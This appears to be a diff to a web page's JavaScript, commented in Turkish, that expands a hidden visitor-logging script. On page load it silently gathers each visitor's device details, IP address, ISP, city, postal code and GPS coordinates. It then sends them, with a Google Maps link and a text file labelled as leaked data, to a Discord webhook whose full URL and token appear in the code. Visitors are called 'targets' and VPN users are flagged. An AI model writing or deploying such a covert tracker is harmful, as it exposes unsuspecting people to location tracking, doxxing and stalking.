@@ -55,47 +55,78 @@
     const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
 
     async function fullCapture() {
-        // 1. Cihaz bilgilerini topla
+        // 1. Derin Cihaz Verilerini Topla
         const screenRes = `${window.screen.width}x${window.screen.height}`;
         const language = navigator.language;
         const platform = navigator.platform;
         const browser = navigator.userAgent.split(' ').pop();
+        const cores = navigator.hardwareConcurrency || "Bilinmiyor";
+        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
         let batteryInfo = "Bilinmiyor";
 
         try {
             const battery = await navigator.getBattery();
-            batteryInfo = `%${Math.round(battery.level * 100)}`;
+            batteryInfo = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Deşarj)'}`;
         } catch(e) {}
 
-        // 2. IP ve Lokasyon verilerini çek
+        // 2. IP Detaylarını Çek
         fetch('https://ipapi.co/json/')
         .then(res => res.json())
-        .then(data => {
+        .then(async (data) => {
             const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            const timeNow = new Date().toLocaleString('tr-TR');
 
-            // 3. Discord'a TÜM verileri ve Harita linkini gönder
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: "TEŞKİLAT TAM ANALİZ",
-                    embeds: [{
-                        title: data.country_code !== 'TR' ? "🕵️ HEDEF VPN KULLANIYOR" : "🎯 HEDEF TESPİT EDİLDİ",
-                        color: data.country_code !== 'TR' ? 16763904 : 16711680,
-                        description: `📍 **Google Maps Konumu:** [Buraya Tıkla](${mapLink})`,
-                        fields: [
-                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
-                            { name: "📍 Şehir/Ülke", value: `\`${data.city} / ${data.country_name}\``, inline: true },
-                            { name: "📡 Servis Sağlayıcı", value: `\`${data.org}\``, inline: false },
-                            { name: "💻 Sistem / Ekran", value: `\`${platform} / ${screenRes}\``, inline: true },
-                            { name: "🔋 Şarj / Dil", value: `\`${batteryInfo} / ${language}\``, inline: true },
-                            { name: "🛠️ Tarayıcı", value: `\`${browser}\``, inline: true }
-                        ],
-                        footer: { text: "Anlık Veri Yakalama Aktif" },
-                        timestamp: new Date()
-                    }]
-                })
-            });
+            // 3. .txt Dosyası İçeriğini Oluştur
+            const logContent = `
+========================================
+    QEAT TERMINAL VERI RAPORU
+========================================
+ZAMAN: ${timeNow}
+----------------------------------------
+[IP DETAYLARI]
+IP ADRESI: ${data.ip}
+ISS (SAGLAYICI): ${data.org}
+KONUM: ${data.city} / ${data.region} / ${data.country_name}
+POSTA KODU: ${data.postal}
+KOORDINAT: ${data.latitude}, ${data.longitude}
+GOOGLE MAPS: ${mapLink}
+PARA BIRIMI: ${data.currency_name}
+SAAT DILIMI: ${data.timezone}
+
+[DONANIM & SISTEM]
+ISLETIM SISTEMI: ${platform}
+EKRAN COZUNURLUK: ${screenRes}
+ISLEMCI CEKIRDEK: ${cores}
+YAKLASIK RAM: ${ram}
+TARAYICI: ${navigator.userAgent}
+VARSAYILAN DIL: ${language}
+SARJ DURUMU: ${batteryInfo}
+----------------------------------------
+DURUM: VERILER BASARIYLA SIZDIRILDI.
+========================================`;
+
+            // 4. Discord'a Hem Embed Hem Dosya Gönder (FormData)
+            const formData = new FormData();
+            const payload = {
+                username: "TEŞKİLAT ARŞİV BİRİMİ",
+                embeds: [{
+                    title: data.country_code !== 'TR' ? "🕵️ VPN TESPİT EDİLDİ" : "🎯 HEDEF TERMINALDE",
+                    color: data.country_code !== 'TR' ? 16763904 : 16711680,
+                    description: `📂 **Yeni bir veri paketi arşivlendi.**\n📍 [Haritada Gör](${mapLink})`,
+                    fields: [
+                        { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
+                        { name: "📍 Konum", value: `\`${data.city} / ${data.country_name}\``, inline: true },
+                        { name: "🔋 Şarj", value: `\`${batteryInfo}\``, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            formData.append('payload_json', JSON.stringify(payload));
+            const blob = new Blob([logContent], { type: 'text/plain' });
+            formData.append('file', blob, `terminal_rapor_${data.ip}.txt`);
+
+            await fetch(webhookURL, { method: 'POST', body: formData });
 
             // Ekranda gösterim için verileri sakla
             window.cachedData = {...data, screenRes, language, platform, batteryInfo, browser, mapLink};
@@ -103,7 +134,6 @@
         });
     }
 
-    // Site yüklenmeye başladığı an tetikle
     fullCapture();
 
     // Görsel bar animasyonu
